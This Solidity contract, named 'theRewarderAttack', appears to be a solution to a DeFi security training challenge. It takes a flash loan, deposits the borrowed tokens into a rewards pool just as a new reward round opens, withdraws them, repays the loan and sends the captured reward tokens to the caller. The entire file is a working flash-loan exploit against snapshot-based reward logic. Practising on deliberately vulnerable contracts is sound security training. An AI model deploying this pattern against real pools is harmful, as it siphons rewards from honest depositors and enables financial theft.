// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface IFlashloan {
    function flashLoan(uint256 amount) external;
}

interface Ipool {
    function deposit(uint256 amountToDeposit) external;
    function withdraw(uint256 amountToWithdraw) external;
    function distributeRewards() external returns (uint256);
    function isNewRewardsRound() external view returns (bool);
}

contract theRewarderAttack {
    IFlashloan public flashLoan;
    Ipool public pool;
    IERC20 liquidityToken;
    IERC20 rewardToken;


    constructor(IFlashloan _flashLoan, Ipool _pool, IERC20 _rewardToken, IERC20 _liquidityToken){
        flashLoan = IFlashloan(_flashLoan);
        pool = Ipool(_pool);
        rewardToken = IERC20(_rewardToken);
        liquidityToken = IERC20(_liquidityToken);
    }

    function attack(uint256 _amount) public payable {
        liquidityToken.approve(address(pool), _amount);
        flashLoan.flashLoan(_amount);
        rewardToken.transfer(msg.sender, rewardToken.balanceOf(address(this)));
    }

    function receiveFlashLoan(uint256 _amount) external {
        if (pool.isNewRewardsRound() == true){
        pool.deposit(_amount);
        pool.withdraw(_amount);
        liquidityToken.transfer(address(flashLoan), _amount);
        } else {
            revert("new Round");
        }
    }
}